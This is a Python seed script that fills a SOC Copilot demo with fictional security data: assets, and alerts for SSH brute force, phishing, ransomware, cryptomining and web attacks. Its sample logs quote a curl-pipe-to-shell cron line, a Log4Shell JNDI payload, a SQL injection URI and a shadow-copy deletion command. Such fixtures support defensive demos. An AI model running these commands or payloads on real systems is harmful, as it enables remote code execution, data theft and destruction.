"""Seed realistic demo data for SOC Copilot.

生成一套连贯的 14 天安全运营剧本数据，用于产品演示与验收：
- 资产台账（生产网 / 办公网 / DMZ / 终端）
- 安全告警（Wazuh / Suricata / Sysmon / OSQuery / CloudTrail 等真实规则语义，含 MITRE ATT&CK 映射）
- 调查案例（时间线、协作评论、SLA 超期）
- IOC 命中 / 封禁 IP / 关联事件 / SIEM 原始日志
- 系统监控历史（24h 资源趋势）
- Playbook 定义与运行记录、漏洞台账、告警分析笔记

用法:
    cd backend
    python scripts/seed_demo_data.py            # 幂等插入（可重复执行）
    python scripts/seed_demo_data.py --reset    # 清除种子数据后重新插入

数据标识: 告警 external_event_id 统一使用 "DEMO-" 前缀；
其余表主键使用固定命名空间 uuid5 生成，保证幂等且可精确清理。
"""

import argparse
import asyncio
import hashlib
import json
import math
import sys
import uuid
from datetime import UTC, datetime, timedelta
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from sqlalchemy import func, select

from db.session import AsyncSessionLocal, init_db
from models.alert_note import AlertNoteModel
from models.asset import AssetDB
from models.blocked_ip import BlockedIP
from models.case import (
    CaseAlertAssociation,
    CaseComment,
    CaseModel,
    CaseTimelineEntry,
)
from models.correlated_event import CorrelatedEvent
from models.ioc_hit import IOCHitDB
from models.monitor_history import MonitorHistoryModel
from models.playbook_definition import PlaybookDefinitionModel
from models.playbook_run import PlaybookRunModel, PlaybookRunStepModel
from models.security_alert import SecurityAlert
from models.security_vulnerability import (
    SecurityVulnerability,
    VulnerabilitySeverity,
    VulnerabilityStatus,
    VulnerabilityType,
)
from models.siem_log import SIEMLog

DEMO_NS = uuid.UUID("5eed0000-0000-4000-8000-00c0ffee0000")
NOW = datetime.now(UTC)


def uid(*parts: str) -> str:
    """Deterministic UUID for idempotent re-runs."""
    return str(uuid.uuid5(DEMO_NS, ":".join(parts)))


def ago(**kwargs) -> datetime:
    return NOW - timedelta(**kwargs)


def sha(value: str) -> str:
    return hashlib.sha256(value.encode()).hexdigest()


async def purge_rows(session, model, *filters) -> int:
    """ORM 逐行删除（配合 session.scalars 查询，供 --reset 精确清理）。"""
    rows = (await session.scalars(select(model).where(*filters))).all()
    for row in rows:
        await session.delete(row)
    return len(rows)


# ────────────────────────────────────────────────────────────────────
# 外部攻击源（IP → GeoIP）
# ────────────────────────────────────────────────────────────────────

EXT_IPS = {
    "45.155.205.233": ("Russia", "RU", "Moscow", 55.75, 37.62),
    "91.240.118.172": ("Russia", "RU", "Moscow", 55.75, 37.62),
    "5.188.206.130": ("Russia", "RU", "Moscow", 55.75, 37.62),
    "222.186.18.35": ("China", "CN", "Jiangsu", 32.06, 118.78),
    "118.25.6.39": ("China", "CN", "Guangdong", 23.13, 113.26),
    "185.220.101.45": ("Netherlands", "NL", "Amsterdam", 52.37, 4.90),
    "141.98.10.60": ("Lithuania", "LT", "Vilnius", 54.69, 25.28),
    "103.4.217.168": ("Vietnam", "VN", "Hanoi", 21.03, 105.85),
    "209.141.35.17": ("United States", "US", "Las Vegas", 36.17, -115.14),
    "196.52.43.54": ("United States", "US", "Dallas", 32.78, -96.80),
    "43.155.132.88": ("Singapore", "SG", "Singapore", 1.35, 103.82),
}


def geoip(ip: str) -> dict | None:
    if ip not in EXT_IPS:
        return None
    country, code, city, lat, lon = EXT_IPS[ip]
    return {
        "country": country,
        "country_code": code,
        "city": city,
        "latitude": lat,
        "longitude": lon,
    }


# ────────────────────────────────────────────────────────────────────
# 资产台账
# ────────────────────────────────────────────────────────────────────

# (hostname, ip, owner, business, criticality, tags, notes)
ASSETS = [
    ("web-prod-01", "10.0.10.11", "li.qiang", "电商平台", "critical",
     "web,nginx,prod", "官方商城前端，PCI-DSS 范围内资产"),
    ("web-prod-02", "10.0.10.12", "li.qiang", "电商平台", "critical",
     "web,nginx,prod", "官方商城前端（灰度节点）"),
    ("api-gateway-01", "10.0.10.20", "li.qiang", "电商平台", "critical",
     "api,kong,prod", "对外 API 网关（Kong 3.6）"),
    ("db-mysql-prod", "10.0.20.10", "zhao.min", "订单数据库", "critical",
     "database,mysql,prod", "MySQL 8.0 主库，承载订单与支付数据"),
    ("db-redis-cache", "10.0.20.15", "zhao.min", "电商平台", "high",
     "cache,redis,prod", "Redis 7 会话与热点缓存"),
    ("dc-dc01", "10.0.1.10", "admin", "办公网-AD", "critical",
     "domain-controller,windows", "主域控，Server 2019"),
    ("dc-dc02", "10.0.1.11", "admin", "办公网-AD", "critical",
     "domain-controller,windows", "辅域控"),
    ("filesrv-01", "10.0.1.20", "wang.fang", "文件共享", "critical",
     "fileserver,windows,smb", "部门文件服务器，含财务共享目录"),
    ("mail-exch-01", "10.0.1.30", "wang.fang", "邮件系统", "high",
     "mail,exchange", "Exchange 2019 内部邮件"),
    ("backup-nas-01", "10.0.40.5", "admin", "备份系统", "high",
     "backup,nas", "异地备份 NAS，Veeam 存储库"),
    ("k8s-node-01", "10.0.30.11", "chen.hao", "容器平台", "high",
     "kubernetes,prod", "K8s 生产节点"),
    ("k8s-node-02", "10.0.30.12", "chen.hao", "容器平台", "high",
     "kubernetes,prod", "K8s 生产节点"),
    ("k8s-node-03", "10.0.30.13", "chen.hao", "容器平台", "medium",
     "kubernetes,staging", "K8s 预发节点"),
    ("dev-jenkins-01", "10.0.50.10", "chen.hao", "研发效能", "medium",
     "ci,jenkins", "Jenkins CI，暴露 8080 端口于研发网段"),
    ("jump-bastion-01", "172.16.0.5", "admin", "运维堡垒机", "critical",
     "bastion,ssh,dmz", "唯一 SSH 运维入口，已启用 MFA"),
    ("vpn-gw-01", "172.16.0.10", "admin", "远程接入", "critical",
     "vpn,fortigate", "FortiGate SSL-VPN 网关"),
    ("fin-laptop-liu", "192.168.20.15", "liu.yiming", "财务系统", "high",
     "endpoint,windows,finance", "财务部 Windows 11 终端"),
    ("hr-laptop-wang", "192.168.20.22", "wang.xiaotong", "人力资源", "medium",
     "endpoint,windows", "HR 部 Windows 终端"),
    ("it-laptop-zhang", "192.168.10.21", "zhang.wei", "IT 运维", "medium",
     "endpoint,macos", "IT 运维 macOS 终端，具有跳板权限"),
]


# ────────────────────────────────────────────────────────────────────
# 告警剧本（story alerts）
# ────────────────────────────────────────────────────────────────────
# 每条: key + 相对小时数 h + 字段。created_at / event_timestamp 同步偏移。

ALERT_SPECS: list[dict] = [
    # ── 支线 A：堡垒机 SSH 暴力破解（跨 14 天的持续性背景威胁）──────
    {"key": "bf-01", "h": 13 * 24 + 6, "source": "wazuh", "event_type": "brute_force",
         "severity": "medium", "title": "SSHD: Brute force login attempt (63 failed attempts)",
         "description": "jump-bastion-01 在 10 分钟内出现 63 次 SSH 密码认证失败，来源 45.155.205.233，目标账户 root/admin。",
         "src_ip": "45.155.205.233", "dst_ip": "172.16.0.5", "protocol": "TCP",
         "agent": "jump-bastion-01", "rule_id": "5712", "rule_level": 10,
         "rule_groups": "sshd,authentication_failures,brute_force",
         "mitre": "Credential Access", "techniques": ["T1110.001"],
         "full_log": "Sep 24 03:12:44 jump-bastion-01 sshd[28411]: Failed password for root from 45.155.205.233 port 51244 ssh2",
         "location": "/var/log/auth.log", "status": "resolved", "mttr_h": 1.2,
         "threat_score": 52, "agg": 63, "tags": ["brute-force", "ssh"],
         "resolution": "fail2ban 已自动封禁来源 IP 24h，核查未发现成功登入。",
         "classification": "true_positive"},
    {"key": "bf-02", "h": 11 * 24, "source": "wazuh", "event_type": "brute_force",
         "severity": "medium", "title": "SSHD: Brute force login attempt (41 failed attempts)",
         "description": "堡垒机再次出现来自 91.240.118.172 的密码喷洒行为，目标账户轮换（root、oracle、admin）。",
         "src_ip": "91.240.118.172", "dst_ip": "172.16.0.5", "protocol": "TCP",
         "agent": "jump-bastion-01", "rule_id": "5712", "rule_level": 10,
         "rule_groups": "sshd,authentication_failures,brute_force",
         "mitre": "Credential Access", "techniques": ["T1110.003"],
         "location": "/var/log/auth.log", "status": "false_positive", "mttr_h": 0.4,
         "threat_score": 40, "agg": 41, "tags": ["brute-force", "ssh", "password-spraying"],
         "resolution": "确认为内部安全团队的红队授权渗透测试流量。",
         "root_cause": "红队演练（变更单 CHG-2026-0912）", "classification": "false_positive"},
    {"key": "bf-03", "h": 9 * 24 + 8, "source": "wazuh", "event_type": "brute_force",
         "severity": "medium", "title": "SSHD: Brute force login attempt (88 failed attempts)",
         "description": "222.186.18.35 对堡垒机 22 端口发起高强度爆破，fail2ban 触发 3 次封禁。",
         "src_ip": "222.186.18.35", "dst_ip": "172.16.0.5", "protocol": "TCP",
         "agent": "jump-bastion-01", "rule_id": "5712", "rule_level": 10,
         "rule_groups": "sshd,authentication_failures,brute_force",
         "mitre": "Credential Access", "techniques": ["T1110.001"],
         "location": "/var/log/auth.log", "status": "resolved", "mttr_h": 0.6,
         "threat_score": 55, "agg": 88, "tags": ["brute-force", "ssh"],
         "resolution": "IP 已列入永久封禁名单，未发现成功登入。", "classification": "true_positive"},
    {"key": "bf-04", "h": 6 * 24 + 3, "source": "wazuh", "event_type": "brute_force",
         "severity": "medium", "title": "SSHD: Brute force login attempt (27 failed attempts)",
         "description": "141.98.10.60 针对堡垒机的低速爆破（每 3-5 分钟一次），持续约 2 小时。",
         "src_ip": "141.98.10.60", "dst_ip": "172.16.0.5", "protocol": "TCP",
         "agent": "jump-bastion-01", "rule_id": "5712", "rule_level": 10,
         "rule_groups": "sshd,authentication_failures,brute_force",
         "mitre": "Credential Access", "techniques": ["T1110.001"],
         "location": "/var/log/auth.log", "status": "resolved", "mttr_h": 2.5,
         "threat_score": 48, "agg": 27, "tags": ["brute-force", "ssh", "low-and-slow"],
         "resolution": "切换为密钥认证策略后攻击面收敛，攻击源已封禁。", "classification": "true_positive"},
    {"key": "bf-05", "h": 3 * 24 + 11, "source": "wazuh", "event_type": "brute_force",
         "severity": "medium", "title": "SSHD: Brute force login attempt (52 failed attempts)",
         "description": "5.188.206.130 爆破 VPN 网关 SSH 管理接口，FortiGate 日志同步记录来源。",
         "src_ip": "5.188.206.130", "dst_ip": "172.16.0.10", "protocol": "TCP",
         "agent": "vpn-gw-01", "rule_id": "5712", "rule_level": 10,
         "rule_groups": "sshd,authentication_failures,brute_force",
         "mitre": "Credential Access", "techniques": ["T1110.001"],
         "location": "/var/log/fortigate/traffic.log", "status": "resolved", "mttr_h": 0.9,
         "threat_score": 50, "agg": 52, "tags": ["brute-force", "ssh", "vpn"],
         "resolution": "管理接口已限制为白名单访问，来源 IP 封禁。", "classification": "true_positive"},
    {"key": "bf-06", "h": 20, "source": "wazuh", "event_type": "brute_force",
         "severity": "medium", "title": "SSHD: Brute force login attempt (34 failed attempts)",
         "description": "185.220.101.45（Tor 出口节点）尝试爆破堡垒机，已触发实时告警。",
         "src_ip": "185.220.101.45", "dst_ip": "172.16.0.5", "protocol": "TCP",
         "agent": "jump-bastion-01", "rule_id": "5712", "rule_level": 10,
         "rule_groups": "sshd,authentication_failures,brute_force",
         "mitre": "Credential Access", "techniques": ["T1110.001"],
         "full_log": "Oct 8 14:22:10 jump-bastion-01 sshd[41022]: Failed password for admin from 185.220.101.45 port 39812 ssh2",
         "location": "/var/log/auth.log", "status": "new",
         "threat_score": 62, "agg": 34, "tags": ["brute-force", "ssh", "tor"]},
    {"key": "bf-07", "h": 4, "source": "wazuh", "event_type": "brute_force",
         "severity": "medium", "title": "SSHD: Brute force login attempt (17 failed attempts)",
         "description": "103.4.217.168 对堡垒机的持续性爆破仍在进行，与近 24h 多源爆破可能为同一僵尸网络。",
         "src_ip": "103.4.217.168", "dst_ip": "172.16.0.5", "protocol": "TCP",
         "agent": "jump-bastion-01", "rule_id": "5712", "rule_level": 10,
         "rule_groups": "sshd,authentication_failures,brute_force",
         "mitre": "Credential Access", "techniques": ["T1110.001"],
         "location": "/var/log/auth.log", "status": "new",
         "threat_score": 58, "agg": 17, "tags": ["brute-force", "ssh"]},
    {"key": "bf-success-01", "h": 21, "source": "wazuh", "event_type": "successful_login",
         "severity": "critical", "title": "SSHD: Authentication succeeded after 27 failed attempts",
         "description": "45.155.205.233 在 27 次失败后成功以账户 deploy 登入 jump-bastion-01，会话持续 4 分钟后注销。需立即核查该账户近期操作。",
         "src_ip": "45.155.205.233", "dst_ip": "172.16.0.5", "protocol": "TCP",
         "agent": "jump-bastion-01", "rule_id": "5715", "rule_level": 12,
         "rule_groups": "sshd,authentication_success,brute_force",
         "mitre": "Credential Access, Defense Evasion", "techniques": ["T1110.001", "T1078"],
         "full_log": "Oct 8 13:47:02 jump-bastion-01 sshd[40193]: Accepted password for deploy from 45.155.205.233 port 47731 ssh2",
         "location": "/var/log/auth.log", "status": "escalated",
         "escalated_to": "security-lead", "esc_reason": "多次失败后成功登入，疑似凭据泄露，需立即排查账户 deploy 的操作轨迹",
         "threat_score": 92, "agg": 1, "tags": ["brute-force", "ssh", "success-after-failures", "p1"]},

    # ── 支线 B：钓鱼邮件 → 凭据窃取 → 云控制台滥用（调查中）─────────
    {"key": "phish-email-01", "h": 74, "source": "office365", "event_type": "phishing",
         "severity": "high", "title": "Credential harvesting email delivered to Finance group (12 recipients)",
         "description": "主题为【发票异常-请核对付款账户】的钓鱼邮件绕过 EOP 投递至财务组 12 名用户，内嵌仿冒 SSO 登录页链接。",
         "agent": "mail-exch-01",
         "mitre": "Initial Access", "techniques": ["T1566.002"],
         "iocs": [{"type": "email", "value": "billing@invoice-notify.net", "confidence": 95},
               {"type": "domain", "value": "mail-verify-secure-login.com", "confidence": 92},
               {"type": "url", "value": "http://mail-verify-secure-login.com/sso/auth.html", "confidence": 92}],
         "full_log": '{"MessageTraceId":"a1b2c3d4","Subject":"发票异常-请核对付款账户","SenderIP":"43.155.132.88","Recipients":12,"Action":"Delivered"}',
         "location": "O365 Message Trace", "status": "investigating",
         "threat_score": 82, "tags": ["phishing", "email", "finance"]},
    {"key": "phish-click-01", "h": 73, "source": "zeek", "event_type": "phishing",
         "severity": "high", "title": "User clicked phishing link, browser redirected to harvest page",
         "description": "fin-laptop-liu（liu.yiming）访问钓鱼域名并提交了 POST 表单，高度怀疑凭据已泄露。",
         "src_ip": "192.168.20.15", "dst_ip": "43.155.132.88", "protocol": "HTTPS",
         "agent": "fin-laptop-liu",
         "mitre": "Initial Access", "techniques": ["T1566.002", "T1204.002"],
         "iocs": [{"type": "domain", "value": "mail-verify-secure-login.com", "confidence": 92}],
         "full_log": '{"ts":"2026-10-08T15:41:22Z","id.orig_h":"192.168.20.15","host":"mail-verify-secure-login.com","uri":"/sso/auth.html","method":"POST","resp_code":200}',
         "location": "/var/log/zeek/http.log", "status": "investigating",
         "threat_score": 88, "tags": ["phishing", "credential-harvesting", "finance"]},
    {"key": "ident-impossible-01", "h": 50, "source": "azure_ad", "event_type": "account_anomaly",
         "severity": "high", "title": "Impossible travel: liu.yiming signed in from Singapore 6 min after China login",
         "description": "账户 liu.yiming@acme-corp.cn 先后在中国（公司出口 IP）与新加坡（AS9009 机房）成功登录 O365，地理间隔不可能。",
         "src_ip": "43.155.132.88",
         "mitre": "Defense Evasion, Initial Access", "techniques": ["T1078.004"],
         "iocs": [{"type": "ip", "value": "43.155.132.88", "confidence": 90}],
         "location": "Azure AD Sign-in Logs", "status": "investigating",
         "threat_score": 85, "tags": ["impossible-travel", "account-takeover", "mfa-fatigue"]},
    {"key": "cloud-iam-key-01", "h": 49, "source": "cloudtrail", "event_type": "cloud_audit",
         "severity": "critical", "title": "New IAM access key created for finance-readonly by liu.yiming",
         "description": "被盗账户在异常登录后 12 分钟为 finance-readonly 创建了新的长期访问密钥，符合云持久化行为特征。",
         "src_ip": "43.155.132.88",
         "mitre": "Persistence", "techniques": ["T1136.003"],
         "iocs": [{"type": "ip", "value": "43.155.132.88", "confidence": 90}],
         "full_log": '{"eventSource":"iam.amazonaws.com","eventName":"CreateAccessKey","userName":"finance-readonly","requestParameters":{"userName":"finance-readonly"},"sourceIPAddress":"43.155.132.88"}',
         "location": "CloudTrail us-east-1", "status": "escalated",
         "escalated_to": "security-lead", "esc_reason": "云上持久化 attempt，需立即禁用密钥并回滚",
         "threat_score": 94, "tags": ["cloud", "persistence", "iam"]},
    {"key": "cloud-s3-public-01", "h": 47, "source": "cloudtrail", "event_type": "cloud_audit",
         "severity": "critical", "title": "S3 bucket policy changed to public-read on finance-exports",
         "description": "finance-exports 存储桶策略被改为公开可读，含 2025 年度工资单导出文件，存在数据泄露风险。",
         "src_ip": "43.155.132.88",
         "mitre": "Collection, Exfiltration", "techniques": ["T1530"],
         "full_log": '{"eventSource":"s3.amazonaws.com","eventName":"PutBucketPolicy","bucketName":"finance-exports","sourceIPAddress":"43.155.132.88"}',
         "location": "CloudTrail us-east-1", "status": "investigating",
         "threat_score": 90, "tags": ["cloud", "s3", "data-exposure"]},

    # ── 支线 C：勒索软件部署链（P1 应急中，SLA 已超期）──────────────
    {"key": "c2-beacon-01", "h": 26, "source": "suricata", "event_type": "malware_c2",
         "severity": "critical", "title": "ET MALWARE Cobalt Strike Beacon Observed (209.141.35.17)",
         "description": "it-laptop-zhang 向 209.141.35.17:443 发送周期性加密心跳，特征匹配 Cobalt Strike Malleable C2 profile。",
         "src_ip": "192.168.10.21", "dst_ip": "209.141.35.17", "protocol": "HTTPS",
         "agent": "it-laptop-zhang", "rule_id": "2024312", "rule_level": 2,
         "rule_groups": "malware,c2,traffic",
         "mitre": "Command and Control", "techniques": ["T1071.001", "T1573"],
         "iocs": [{"type": "ip", "value": "209.141.35.17", "confidence": 96},
               {"type": "domain", "value": "update-cdn-service-cdn.xyz", "confidence": 88}],
         "full_log": '{"timestamp":"2026-10-09T10:04:11Z","src_ip":"192.168.10.21","dest_ip":"209.141.35.17","dest_port":443,"signature":"ET MALWARE Cobalt Strike Beacon","alert":{"signature_id":2024312}}',
         "location": "/var/log/suricata/eve.json", "status": "investigating",
         "threat_score": 97, "tags": ["c2", "cobalt-strike", "p1"]},
    {"key": "lsass-01", "h": 24, "source": "sysmon", "event_type": "credential_access",
         "severity": "critical", "title": "Suspected LSASS memory access (Mimikatz pattern) on dc-dc01",
         "description": "未知进程 rundll32.exe 以 PROCESS_VM_READ 访问 lsass.exe，调用栈特征与 Mimikatz 一致，域控凭据面临泄露风险。",
         "dst_ip": "10.0.1.10", "protocol": "N/A",
         "agent": "dc-dc01", "rule_id": "92032", "rule_level": 13,
         "rule_groups": "sysmon,credential_access,mimikatz",
         "mitre": "Credential Access", "techniques": ["T1003.001"],
         "iocs": [{"type": "sha256", "value": sha("mimikatz-sample-dc-dc01"), "confidence": 91}],
         "full_log": '{"EventID":10,"Image":"C:\\\\Windows\\\\System32\\\\rundll32.exe","TargetImage":"C:\\\\Windows\\\\system32\\\\lsass.exe","GrantedAccess":"0x1010","SourceUser":"ACME\\\\svc_backup$","CallTrace":"UNKNOWN(00007FF...)"}',
         "location": "WinEventLog // Microsoft-Windows-Sysmon/Operational", "status": "investigating",
         "threat_score": 95, "tags": ["mimikatz", "credential-dumping", "p1"]},
    {"key": "newadmin-01", "h": 23, "source": "wazuh", "event_type": "account_change",
         "severity": "high", "title": "New account 'svc_backup$' added to built-in Administrators group",
         "description": "域控 dc-dc01 出现新增本地管理员账户 svc_backup$（带 $ 后缀，规避常规枚举），创建时间在非工作时段。",
         "dst_ip": "10.0.1.10",
         "agent": "dc-dc01", "rule_id": "5744", "rule_level": 11,
         "rule_groups": "windows,account_management,persistence",
         "mitre": "Persistence, Privilege Escalation", "techniques": ["T1136.001"],
         "full_log": "EventID 4732: A member was added to a security-enabled local group. MemberName: ACME\\svc_backup$, GroupName: Administrators, SubjectUser: ACME\\helpdesk",
         "location": "WinEventLog // Security", "status": "investigating",
         "threat_score": 88, "tags": ["persistence", "rogue-admin", "p1"]},
    {"key": "psexec-01", "h": 22, "source": "sysmon", "event_type": "lateral_movement",
         "severity": "critical", "title": "PsExec service installed on filesrv-01 from it-laptop-zhang",
         "description": "it-laptop-zhang（zhang.wei 会话）通过 SMB 向 filesrv-01 安装 PSEXESVC 服务并启动 encrypt_helper.exe，典型横向移动行为。",
         "src_ip": "192.168.10.21", "dst_ip": "10.0.1.20", "protocol": "SMB",
         "agent": "filesrv-01", "rule_id": "92010", "rule_level": 12,
         "rule_groups": "sysmon,lateral_movement,psexec",
         "mitre": "Lateral Movement", "techniques": ["T1021.002", "T1569.002"],
         "iocs": [{"type": "sha256", "value": sha("encrypt_helper-binary"), "confidence": 89}],
         "full_log": '{"EventID":7045,"ServiceName":"PSEXESVC","ImagePath":"C:\\\\Windows\\\\PSEXESVC.exe","AccountName":"ACME\\\\zhang.wei","HostName":"filesrv-01"}',
         "location": "WinEventLog // System", "status": "investigating",
         "threat_score": 93, "tags": ["lateral-movement", "psexec", "p1"]},
    {"key": "vssdel-01", "h": 21, "source": "wazuh", "event_type": "defense_evasion",
         "severity": "critical", "title": "vssadmin.exe delete shadows /all /quiet executed on filesrv-01",
         "description": "文件服务器上执行了卷影副本删除命令，属于勒索软件清除恢复途径的典型前置动作。",
         "dst_ip": "10.0.1.20",
         "agent": "filesrv-01", "rule_id": "92213", "rule_level": 13,
         "rule_groups": "windows,ransomware,defense_evasion",
         "mitre": "Impact", "techniques": ["T1490"],
         "full_log": "Process Create: vssadmin.exe delete shadows /all /quiet — ParentImage: C:\\\\Windows\\\\Temp\\\\encrypt_helper.exe, User: ACME\\\\zhang.wei",
         "location": "WinEventLog // Security (Sysmon EID 1)", "status": "investigating",
         "threat_score": 96, "tags": ["ransomware", "shadow-copy-deletion", "p1"]},
    {"key": "ransom-fim-01", "h": 20, "source": "osquery", "event_type": "file_integrity",
         "severity": "critical", "title": "FIM: 3,214 files modified with .locked extension within 5 minutes",
         "description": "filesrv-01 /data/share 目录 5 分钟内 3214 个文件被重命名追加 .locked 后缀，且同目录出现 README_RESTORE.txt 勒索信。",
         "dst_ip": "10.0.1.20",
         "agent": "filesrv-01", "rule_id": "osq-fim-77", "rule_level": 15,
         "rule_groups": "fim,ransomware,impact",
         "mitre": "Impact", "techniques": ["T1486"],
         "iocs": [{"type": "sha256", "value": sha("ransomware-lockbit-variant-sample"), "confidence": 94,
                "note": "README_RESTORE.txt 内嵌的解密器样本"}],
         "full_log": '{"name":"file_changes","columns":{"target_path":"/data/share/**/*.locked","action":"RENAMED","count":3214,"hostname":"filesrv-01"},"time":"2026-10-09T16:02:44Z"}',
         "location": "/var/osquery/results.log", "status": "investigating",
         "threat_score": 99, "agg": 1, "tags": ["ransomware", "file-encryption", "p1"]},

    # ── 支线 D：K8s 挖矿木马（已结案）────────────────────────────
    {"key": "miner-pool-01", "h": 122, "source": "suricata", "event_type": "crypto_mining",
         "severity": "high", "title": "ET MALWARE XMRig Crypto Miner Pool Connection (pool.supportxmr.top)",
         "description": "k8s-node-03 存在到 Monero 矿池的持续 TLS 连接，上行哈希率特征明显。",
         "src_ip": "10.0.30.13", "dst_ip": "91.240.118.172", "protocol": "TLS",
         "agent": "k8s-node-03", "rule_id": "2046496", "rule_level": 2,
         "rule_groups": "malware,crypto_mining,pool",
         "mitre": "Impact", "techniques": ["T1496"],
         "iocs": [{"type": "domain", "value": "pool.supportxmr.top", "confidence": 85},
               {"type": "ip", "value": "91.240.118.172", "confidence": 80}],
         "location": "/var/log/suricata/eve.json", "status": "resolved", "mttr_h": 5.5,
         "threat_score": 75, "tags": ["crypto-mining", "kubernetes"],
         "resolution": "终止恶意容器（镜像 nginx:alpine 被投毒的私有 tag），清理矿池域名解析，修复 Jenkins 未授权 API 入口。",
         "root_cause": "Jenkins 8080 未授权访问被利用，通过构建任务在预发节点拉起挖矿容器。",
         "remediation": "1) Jenkins 启用认证与 CSRF 保护 2) 镜像仓库启用内容信任 3) K8s NetworkPolicy 限制 egress",
         "classification": "true_positive"},
    {"key": "miner-proc-01", "h": 121, "source": "osquery", "event_type": "process_anomaly",
         "severity": "medium", "title": "Suspicious process 'kdevtmpfsi' consuming 94% CPU on k8s-node-03",
         "description": "伪装内核线程名的挖矿进程 kdevtmpfsi 长时间占用 94% CPU，父进程为容器内 shell。",
         "dst_ip": "10.0.30.13",
         "agent": "k8s-node-03", "rule_id": "osq-proc-31", "rule_level": 7,
         "rule_groups": "process,crypto_mining",
         "mitre": "Impact", "techniques": ["T1496"],
         "location": "/var/osquery/results.log", "status": "resolved", "mttr_h": 5.8,
         "threat_score": 68, "tags": ["crypto-mining"],
         "resolution": "与 miner-pool-01 同一事件，容器已清理。", "classification": "true_positive"},
    {"key": "miner-cron-01", "h": 120, "source": "wazuh", "event_type": "persistence",
         "severity": "medium", "title": "Suspicious crontab modification /etc/cron.d/root on dev-jenkins-01",
         "description": "dev-jenkins-01 新增 cron 任务定期从 update-cdn-service-cdn.xyz 下载并执行脚本，为挖矿持久化。",
         "dst_ip": "10.0.50.10",
         "agent": "dev-jenkins-01", "rule_id": "530", "rule_level": 8,
         "rule_groups": "persistence,cron",
         "mitre": "Persistence", "techniques": ["T1053.003"],
         "iocs": [{"type": "domain", "value": "update-cdn-service-cdn.xyz", "confidence": 88}],
         "full_log": "Oct 14 09:22:01 dev-jenkins-01 CRON[22113]: (root) CMD (curl -fsSL http://update-cdn-service-cdn.xyz/init.sh | sh)",
         "location": "/var/log/syslog", "status": "resolved", "mttr_h": 6.2,
         "threat_score": 70, "tags": ["persistence", "cron", "crypto-mining"],
         "resolution": "删除恶意 cron 与下载脚本，重置 root 凭据。", "classification": "true_positive"},

    # ── 支线 E：Web 应用攻击（已结案）────────────────────────────
    {"key": "sqli-01", "h": 188, "source": "modsecurity", "event_type": "web_attack",
         "severity": "medium", "title": "SQL injection pattern blocked: UNION SELECT in /api/v1/products",
         "description": "WAF 拦截针对商品列表接口的 UNION 注入探测，payload 携带 information_schema 枚举。",
         "src_ip": "196.52.43.54", "dst_ip": "10.0.10.11", "protocol": "HTTP",
         "agent": "web-prod-01", "rule_id": "942100", "rule_level": 7,
         "rule_groups": "waf,sqli,owasp-crs",
         "mitre": "Initial Access", "techniques": ["T1190"],
         "full_log": '[client 196.52.43.54] ModSecurity: Access denied with code 403. Pattern match "(?i:union\\\\s+select)" at ARGS:id. [hostname "shop.acme-corp.cn"] [uri "/api/v1/products?id=1 UNION SELECT user,password FROM users"]',
         "location": "/var/log/modsec_audit.log", "status": "false_positive", "mttr_h": 0.3,
         "threat_score": 35, "tags": ["sqli", "waf", "automated-scanner"],
         "resolution": "自动化扫描器流量，WAF 正常拦截，无实际影响。", "classification": "false_positive"},
    {"key": "sqli-02", "h": 165, "source": "modsecurity", "event_type": "web_attack",
         "severity": "medium", "title": "Time-based blind SQLi attempt (sleep payload) in /api/v1/orders",
         "description": "针对订单接口的时间盲注探测，sleep(5) payload 连续 40 次被 WAF 拦截。",
         "src_ip": "196.52.43.54", "dst_ip": "10.0.10.12", "protocol": "HTTP",
         "agent": "web-prod-02", "rule_id": "942150", "rule_level": 7,
         "rule_groups": "waf,sqli,owasp-crs",
         "mitre": "Initial Access", "techniques": ["T1190"],
         "location": "/var/log/modsec_audit.log", "status": "false_positive", "mttr_h": 0.2,
         "threat_score": 38, "tags": ["sqli", "waf"],
         "resolution": "同源扫描活动，已拦截。", "classification": "false_positive"},
    {"key": "sqli-03", "h": 140, "source": "modsecurity", "event_type": "web_attack",
         "severity": "medium", "title": "sqlmap User-Agent detected against /api/v1/login",
         "description": "UA 为 sqlmap/1.8 的自动化注入测试，已阻断 IP。",
         "src_ip": "118.25.6.39", "dst_ip": "10.0.10.11", "protocol": "HTTP",
         "agent": "web-prod-01", "rule_id": "913100", "rule_level": 7,
         "rule_groups": "waf,sqli,scanner_detection",
         "mitre": "Initial Access", "techniques": ["T1190"],
         "location": "/var/log/modsec_audit.log", "status": "resolved", "mttr_h": 0.5,
         "threat_score": 42, "tags": ["sqli", "sqlmap"],
         "resolution": "IP 已封禁，接口层无异常查询。", "classification": "true_positive"},
    {"key": "log4shell-01", "h": 150, "source": "modsecurity", "event_type": "web_attack",
         "severity": "critical", "title": "Log4Shell (CVE-2021-44228) JNDI lookup attempt against web-prod-02",
         "description": "User-Agent 携带 ${jndi:ldap://45.155.205.233:1389/exp} 的 Log4Shell 利用尝试，WAF 已拦截；同日完成 JDK 缓解。",
         "src_ip": "45.155.205.233", "dst_ip": "10.0.10.12", "protocol": "HTTP",
         "agent": "web-prod-02", "rule_id": "944110", "rule_level": 12,
         "rule_groups": "waf,log4j,rce,cve-2021-44228",
         "mitre": "Initial Access", "techniques": ["T1190"],
         "iocs": [{"type": "ip", "value": "45.155.205.233", "confidence": 90}],
         "full_log": 'ModSecurity: Access denied. Pattern match "(?i)\\\\$\\\\{.*jndi" at REQUEST_HEADERS:User-Agent. Value: "${jndi:ldap://45.155.205.233:1389/exp}"',
         "location": "/var/log/modsec_audit.log", "status": "resolved", "mttr_h": 3.5,
         "threat_score": 85, "tags": ["log4shell", "rce", "cve-2021-44228"],
         "resolution": "WAF 拦截成功；dev-jenkins-01 关联组件当日升级 log4j 2.17.1 并全网复扫确认无残留。",
         "root_cause": "外部扫描器批量利用尝试", "remediation": "升级受影响组件；保持 WAF Log4j 虚拟补丁开启",
         "classification": "true_positive"},
    {"key": "nmap-web-01", "h": 145, "source": "suricata", "event_type": "reconnaissance",
         "severity": "low", "title": "ET SCAN Possible Nmap User-Agent Observed against web tier",
         "description": "外部 IP 使用 Nmap 对 web-prod-01/02 进行目录与端口扫描，无后续利用行为。",
         "src_ip": "196.52.43.54", "dst_ip": "10.0.10.11", "protocol": "HTTP",
         "agent": "web-prod-01", "rule_id": "2020958", "rule_level": 3,
         "rule_groups": "scan,nmap,recon",
         "mitre": "Discovery", "techniques": ["T1046"],
         "location": "/var/log/suricata/eve.json", "status": "false_positive", "mttr_h": 0.1,
         "threat_score": 15, "tags": ["scan", "recon"],
